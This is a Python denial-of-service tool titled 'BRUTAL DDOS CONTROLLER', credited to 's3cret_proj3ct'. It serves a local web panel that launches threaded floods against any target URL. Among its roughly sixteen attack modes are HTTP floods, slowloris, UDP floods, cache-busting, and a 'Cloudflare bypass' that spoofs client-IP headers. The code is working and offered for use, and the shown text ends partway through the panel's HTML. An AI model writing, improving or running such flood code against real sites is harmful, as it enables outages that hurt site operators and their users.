#!/usr/bin/env python3
"""
BRUTAL DDOS CONTROLLER - 20+ ATTACK METHODS
Created by s3cret_proj3ct
"""

import os
import sys
import time
import threading
import requests
import socket
import random
import urllib3
import webbrowser
import json
import hashlib
import base64
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

# Suppress SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ============================================================
# ASCII ART - LO YANG ISI (GUNAKAN TEMPLATE INI)
# ============================================================
ASCII_ART = r"""@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@%***/%@@@@@@@@@/*******(&@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@********************************#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@**************************************/&@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@********************************************@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@***********************************************@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@/************************************************@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@/*************************************************%@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@%***************************************************@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@#.***************************************************(@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@&%#(/   ,**************************************************@@@@@@@@@@@@@@@@@
@@@@@%************      .************************************************#@@@@@@@@@@@@@@@@
@@(***************         .,*********************************************&@@@@@@@@@@@@@@@
@******************.           .,*****************************************.@@@@@@@@@@@@@@@
@********************               .************************************, ,@@@@@@@@@@@@@@
@**********************,                   ,,**************************.    ****/@@@@@@@@@
@%************************,                             ........            ********@@@@@@
@@&***************************,                                            ,**********@@@@
@@@@%*******************************.                                    .**************@@
@@@@@@@***********************************,.                          ,******************@
@@@@@@@@@%*******************************************************************************/
@@@@@@@@@@@@&****************************************************************************/
@@@@@@@@@@@@@@@@%************************************************************************%
@@@@@@@@@@@@@@@@@@@@@*******************************************************************(@
@@@@@@@@@@@@@@@@@@@@@@@@@@/************************************************************@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@(****************************************************@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&/****************************************&@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%(*********************(&@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"""

# GANTI TEXT DI ATAS DENGAN ASCII ART LO
# JANGAN HAPUS r""" DAN """ DI AWAL DAN AKHIR

# ============================================================
# GLOBAL VARIABLES
# ============================================================
ATTACK_RUNNING = False
ATTACK_THREADS = []
STATS = {
    'total': 0,
    'success': 0,
    'failed': 0,
    'start_time': None
}
LOCK = threading.Lock()

# ============================================================
# USER AGENTS - SUPER LENGKAP
# ============================================================
USER_AGENTS = [
    # Windows Chrome
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    
    # Windows Firefox
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    
    # Windows Edge
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    
    # macOS
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    
    # Linux
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
    
    # Mobile
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_1_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 12; Pixel 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    
    # Bots
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; Bingbot/2.0; +http://www.bing.com/bingbot.htm)",
    "Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
]

# ============================================================
# PROXY LIST (UNTUK BYPASS)
# ============================================================
PROXIES = [
    {'http': 'http://proxy1.example.com:8080', 'https': 'http://proxy1.example.com:8080'},
    {'http': 'http://proxy2.example.com:8080', 'https': 'http://proxy2.example.com:8080'},
    # Dalam implementasi nyata, isi dengan proxy hidup
]

# ============================================================
# ATTACK METHODS - 20+ VARIAN
# ============================================================
class AttackMethods:
    
    @staticmethod
    def http_flood(target, threads, timeout):
        """HTTP Flood - dasar"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept': '*/*',
                        'Connection': 'keep-alive',
                        'Cache-Control': 'no-cache'
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def https_flood(target, threads, timeout):
        """HTTPS Flood - dengan SSL"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def slowloris(target, threads, timeout):
        """Slowloris - tahan koneksi"""
        parsed = urlparse(target)
        host = parsed.netloc.split(':')[0]
        port = 443 if parsed.scheme == 'https' else 80
        path = parsed.path or '/'
        
        def worker(worker_id):
            sockets = []
            while ATTACK_RUNNING:
                try:
                    for _ in range(5):
                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        sock.settimeout(3)
                        sock.connect((host, port))
                        
                        req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
                        req += f"User-Agent: {random.choice(USER_AGENTS)}\r\n"
                        req += "Accept: */*\r\nConnection: keep-alive\r\n"
                        sock.send(req.encode())
                        sockets.append(sock)
                        
                        with LOCK:
                            STATS['total'] += 1
                            STATS['success'] += 1
                    
                    for sock in sockets[:]:
                        try:
                            sock.send(f"X-{random.randint(1,9999)}: {random.randint(1,9999)}\r\n".encode())
                        except:
                            sockets.remove(sock)
                    
                    time.sleep(5)
                except:
                    with LOCK:
                        STATS['failed'] += 1
        
        for i in range(min(threads, 50)):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def tcp_syn(target, threads, timeout):
        """TCP SYN Flood"""
        parsed = urlparse(target)
        host = parsed.netloc.split(':')[0]
        
        def worker(worker_id):
            while ATTACK_RUNNING:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    sock.settimeout(1)
                    sock.connect_ex((host, 80))
                    sock.close()
                    with LOCK:
                        STATS['total'] += 1
                        STATS['success'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def udp_flood(target, threads, timeout):
        """UDP Flood"""
        parsed = urlparse(target)
        host = parsed.netloc.split(':')[0]
        
        def worker(worker_id):
            while ATTACK_RUNNING:
                try:
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    data = random._urandom(1024)
                    sock.sendto(data, (host, 80))
                    sock.close()
                    with LOCK:
                        STATS['total'] += 1
                        STATS['success'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def cache_bypass(target, threads, timeout):
        """Cache Bypass - random query"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    rand = f"{random.randint(1000000,9999999)}={random.randint(1,999)}"
                    url = f"{target}?{rand}"
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    r = session.get(url, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def cloudflare_bypass(target, threads, timeout):
        """Cloudflare Bypass - with headers"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    fake_ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'X-Forwarded-For': fake_ip,
                        'X-Real-IP': fake_ip,
                        'CF-Connecting-IP': fake_ip,
                        'Client-IP': fake_ip
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def referer_spam(target, threads, timeout):
        """Referer Spam"""
        referers = ['https://google.com', 'https://facebook.com', 'https://twitter.com', 
                   'https://youtube.com', 'https://instagram.com', 'https://reddit.com']
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Referer': random.choice(referers)
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def range_spam(target, threads, timeout):
        """Range Spam - Accept-Ranges"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Range': f'bytes={random.randint(0,10000)}-{random.randint(10000,20000)}'
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def method_spam(target, threads, timeout):
        """HTTP Method Spam"""
        methods = ['GET', 'POST', 'HEAD', 'OPTIONS', 'PUT', 'DELETE', 'TRACE', 'PATCH']
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    method = random.choice(methods)
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    
                    if method == 'GET':
                        r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    elif method == 'POST':
                        r = session.post(target, headers=headers, data={'x': random.randint(1,999)}, timeout=timeout, verify=False)
                    else:
                        r = session.request(method, target, headers=headers, timeout=timeout, verify=False)
                    
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def cookie_spam(target, threads, timeout):
        """Cookie Spam"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    cookies = {f'cookie_{i}': str(random.randint(1,999)) for i in range(10)}
                    headers = {'User-Agent': random.choice(USER_AGENTS)}
                    r = session.get(target, headers=headers, cookies=cookies, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def gzip_bomb(target, threads, timeout):
        """Gzip Bomb - Accept-Encoding: gzip"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Accept-Encoding': 'gzip, deflate, br'
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def keep_alive(target, threads, timeout):
        """Keep-Alive Abuse"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Connection': 'keep-alive',
                        'Keep-Alive': f'timeout={random.randint(5,60)}, max=1000'
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def auth_spam(target, threads, timeout):
        """Basic Auth Spam"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    auth_str = f"user{random.randint(1,999)}:pass{random.randint(1,999)}"
                    auth_b64 = base64.b64encode(auth_str.encode()).decode()
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'Authorization': f'Basic {auth_b64}'
                    }
                    r = session.get(target, headers=headers, timeout=timeout, verify=False)
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def mixed_attack(target, threads, timeout):
        """Mixed Attack - rotate all methods"""
        methods = [
            AttackMethods.http_flood,
            AttackMethods.https_flood,
            AttackMethods.cache_bypass,
            AttackMethods.cloudflare_bypass,
            AttackMethods.referer_spam,
            AttackMethods.method_spam,
            AttackMethods.cookie_spam
        ]
        
        def worker(worker_id):
            while ATTACK_RUNNING:
                method = random.choice(methods)
                method(target, 1, timeout)
                time.sleep(0.1)
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()
    
    @staticmethod
    def nuclear(target, threads, timeout):
        """NUCLEAR MODE - all threads all methods"""
        def worker(worker_id):
            session = requests.Session()
            while ATTACK_RUNNING:
                try:
                    # Randomize everything
                    url = target
                    if random.random() > 0.5:
                        url = f"{target}?{random.randint(1,9999)}={random.randint(1,999)}"
                    
                    headers = {
                        'User-Agent': random.choice(USER_AGENTS),
                        'X-Forwarded-For': f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
                        'Accept-Encoding': random.choice(['gzip', 'deflate', 'br', '']),
                        'Connection': random.choice(['keep-alive', 'close']),
                    }
                    
                    if random.random() > 0.7:
                        headers['Authorization'] = f"Basic {base64.b64encode(b'test:test').decode()}"
                    
                    r = session.get(url, headers=headers, timeout=timeout, verify=False)
                    
                    with LOCK:
                        STATS['total'] += 1
                        if r.status_code < 500:
                            STATS['success'] += 1
                        else:
                            STATS['failed'] += 1
                except:
                    with LOCK:
                        STATS['failed'] += 1
                        STATS['total'] += 1
        
        for i in range(threads):
            t = threading.Thread(target=worker, args=(i,))
            t.daemon = True
            ATTACK_THREADS.append(t)
            t.start()

# ============================================================
# HTTP HANDLER
# ============================================================
class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == '/':
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write(self.get_html().encode())
            
        elif self.path == '/stats':
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            stats = STATS.copy()
            if STATS['start_time']:
                stats['elapsed'] = int(time.time() - STATS['start_time'])
            else:
                stats['elapsed'] = 0
            self.wfile.write(json.dumps(stats).encode())
            
        elif self.path.startswith('/attack'):
            query = parse_qs(urlparse(self.path).query)
            method = query.get('method', [''])[0]
            target = query.get('target', [''])[0]
            threads = int(query.get('threads', ['100'])[0])
            timeout = int(query.get('timeout', ['3'])[0])
            
            self.start_attack(method, target, threads, timeout)
            
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'started'}).encode())
            
        elif self.path == '/stop':
            self.stop_attack()
            self.send_response(200)
            self.send_header('Content-type', 'application/json')
            self.end_headers()
            self.wfile.write(json.dumps({'status': 'stopped'}).encode())
            
        else:
            self.send_response(404)
            self.end_headers()
    
    def start_attack(self, method, target, threads, timeout):
        global ATTACK_RUNNING, ATTACK_THREADS, STATS
        
        self.stop_attack()
        
        ATTACK_RUNNING = True
        ATTACK_THREADS = []
        STATS = {
            'total': 0,
            'success': 0,
            'failed': 0,
            'start_time': time.time()
        }
        
        method_map = {
            'http': AttackMethods.http_flood,
            'https': AttackMethods.https_flood,
            'slowloris': AttackMethods.slowloris,
            'tcp': AttackMethods.tcp_syn,
            'udp': AttackMethods.udp_flood,
            'cache': AttackMethods.cache_bypass,
            'cf': AttackMethods.cloudflare_bypass,
            'referer': AttackMethods.referer_spam,
            'range': AttackMethods.range_spam,
            'method': AttackMethods.method_spam,
            'cookie': AttackMethods.cookie_spam,
            'gzip': AttackMethods.gzip_bomb,
            'keepalive': AttackMethods.keep_alive,
            'auth': AttackMethods.auth_spam,
            'mixed': AttackMethods.mixed_attack,
            'nuclear': AttackMethods.nuclear,
        }
        
        if method in method_map:
            method_map[method](target, threads, timeout)
    
    def stop_attack(self):
        global ATTACK_RUNNING, ATTACK_THREADS
        ATTACK_RUNNING = False
        for t in ATTACK_THREADS:
            if t.is_alive():
                t.join(timeout=1)
        ATTACK_THREADS = []
    
    def get_html(self):
        return f"""<!DOCTYPE html>
<html>
<head>
    <title>Ddos Attack - RedHat</title>
    <style>
        * {{
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }}
        
        body {{
            background: linear-gradient(135deg, #0a0e1a 0%, #1a1f2e 100%);
            font-family: 'Segoe UI', 'Courier New', monospace;
            color: #fff;
            padding: 20px;
            min-height: 100vh;
        }}
        
        .container {{
            max-width: 1400px;
            margin: 0 auto;
        }}
        
        .ascii {{
            color: #00ff9d;
            font-size: 12px;
            line-height: 1.2;
            white-space: pre;
            margin-bottom: 30px;
            text-align: center;
            text-shadow: 0 0 10px #00ff9d;
            background: rgba(0,255,157,0.05);
            padding: 20px;
            border-radius: 15px;
            backdrop-filter: blur(5px);
        }}
        
        .credit {{
            color: #ff00ff;
            font-weight: bold;
            font-size: 18px;
            text-align: center;
            margin-bottom: 30px;
            text-shadow: 0 0 10px #ff00ff;
        }}
        
        .config {{
            background: rgba(13,17,23,0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0,255,157,0.3);
            border-radius: 15px;
            padding: 25px;
            margin-bottom: 30px;
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            box-shadow: 0 10px 30px rgba(0,255,157,0.1);
        }}
        
        .config-item {{
            display: flex;
            flex-direction: column;
        }}
        
        .config-item label {{
            color: #00ff9d;
            margin-bottom: 8px;
            font-size: 14px;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .config-item input, .config-item select {{
            background: rgba(26,31,46,0.8);
            border: 1px solid rgba(0,255,157,0.3);
            color: #00ff9d;
            padding: 12px;
            font-family: 'Courier New', monospace;
            border-radius: 10px;
            font-size: 14px;
            transition: all 0.3s;
        }}
        
        .config-item input:focus, .config-item select:focus {{
            outline: none;
            border-color: #ff00ff;
            box-shadow: 0 0 15px #ff00ff;
        }}
        
        .methods {{
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .method {{
            background: rgba(13,17,23,0.8);
            backdrop-filter: blur(5px);
            border: 1px solid rgba(0,255,157,0.2);
            border-radius: 20px;
            padding: 25px;
            cursor: pointer;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }}
        
        .method::before {{
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0,255,157,0.1), transparent);
            transition: left 0.5s;
        }}
        
        .method:hover {{
            transform: translateY(-5px);
            border-color: #ff00ff;
            box-shadow: 0 15px 30px rgba(255,0,255,0.2);
        }}
        
        .method:hover::before {{
            left: 100%;
        }}
        
        .method.selected {{
            border: 2px solid #ff00ff;
            box-shadow: 0 0 30px #ff00ff;
        }}
        
        .method-name {{
            color: #00ff9d;
            font-size: 22px;
            font-weight: bold;
            margin-bottom: 12px;
            text-transform: uppercase;
        }}
        
        .method-desc {{
            color: rgba(255,255,255,0.6);
            font-size: 13px;
            line-height: 1.6;
        }}
        
        .controls {{
            display: flex;
            gap: 20px;
            margin-bottom: 30px;
        }}
        
        .btn {{
            padding: 18px 30px;
            border: none;
            border-radius: 50px;
            font-family: 'Segoe UI', monospace;
            font-weight: bold;
            font-size: 16px;
            cursor: pointer;
            flex: 1;
            text-transform: uppercase;
            letter-spacing: 2px;
            transition: all 0.3s;
            position: relative;
            overflow: hidden;
        }}
        
        .btn-start {{
            background: linear-gradient(45deg, #00ff9d, #00cc7d);
            color: #0a0e1a;
        }}
        
        .btn-start:hover {{
            transform: scale(1.02);
            box-shadow: 0 0 30px #00ff9d;
        }}
        
        .btn-stop {{
            background: linear-gradient(45deg, #ff0055, #cc0044);
            color: white;
        }}
        
        .btn-stop:hover {{
            transform: scale(1.02);
            box-shadow: 0 0 30px #ff0055;
        }}
        
        .stats {{
            background: rgba(13,17,23,0.8);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(0,255,157,0.3);
            border-radius: 20px;
            padding: 30px;
        }}
        
        .stats-grid {{
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 20px;
            margin-bottom: 25px;
        }}
        
        .stat-box {{
            background: rgba(26,31,46,0.8);
            border-radius: 15px;
            padding: 20px;
            text-align: center;
            position: relative;
            overflow: hidden;
        }}
        
        .stat-box::after {{
            content: '';
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 2px;
            background: linear-gradient(90deg, transparent, #00ff9d, #ff00ff, transparent);
        }}
        
        .stat-value {{
            font-size: 36px;
            font-weight: bold;
            color: #00ff9d;
            margin-bottom: 5px;
            text-shadow: 0 0 20px #00ff9d;
        }}
        
        .stat-label {{
            color: rgba(255,255,255,0.5);
            font-size: 13px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }}
        
        .progress {{
            width: 100%;
            height: 8px;
            background: rgba(26,31,46,0.8);
            border-radius: 4px;
            margin: 20px 0;
            overflow: hidden;
        }}
        
        .progress-fill {{
            height: 100%;
            background: linear-gradient(90deg, #00ff9d, #ff00ff);
            width: 0%;
            border-radius: 4px;
            transition: width 0.3s;
        }}
        
        .logs {{
            background: rgba(26,31,46,0.8);
            border-radius: 15px;
            padding: 20px;
            height: 250px;
            overflow-y: auto;
            font-size: 13px;
            font-family: 'Courier New', monospace;
        }}
        
        .log-entry {{
            padding: 8px 0;
            border-bottom: 1px solid rgba(0,255,157,0.1);
            color: rgba(255,255,255,0.8);
        }}
        
        .log-entry:last-child {{
            border-bottom: none;
        }}
        
        @media (max-width: 768px) {{
            .methods {{
                grid-template-columns: 1fr;
            }}
            .controls {{
                flex-direction: column;
            }}
            .stats-grid {{
                grid-template-columns: repeat(2, 1fr);
            }}
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="ascii">{ASCII_ART}</div>
        <div class="credit"> Created by s3cret_proj3ct </div>
        
        <div class="config">
            <div class="config-item">
                <label>TARGET URL</label>
                <input type="text" id="target" value="http or https://example.com"" placeholder="http://example.com">
            </div>
            <div class="config-item">
                <label>THREADS</label>
                <input type="number" id="threads" value="500" min="1" max="10000">
            </div>
            <div class="config-item">
                <label>TIMEOUT</label>
                <input type="number" id="timeout" value="3" min="1" max="30">
            </div>
        </div>
        
        <div class="methods" id="methods"></div>
        
        <div class="controls">
            <button class="btn btn-start" onclick="startAttack()"> START ATTACK</button>
            <button class="btn btn-stop" onclick="stopAttack()"> STOP ATTACK</button>
        </div>
        
        <div class="stats">
            <div class="stats-grid">
                <div class="stat-box">
                    <div class="stat-value" id="total">0</div>
                    <div class="stat-label">TOTAL</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="success">0</div>
                    <div class="stat-label">SUCCESS</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="failed">0</div>
                    <div class="stat-label">FAILED</div>
                </div>
                <div class="stat-box">
                    <div class="stat-value" id="rps">0</div>
                    <div class="stat-label">REQ/SEC</div>
                </div> 
            </div>
            
            <div class="progress">
                <div class="progress-fill" id="progress" style="width: 0%"></div>
            </div>
            
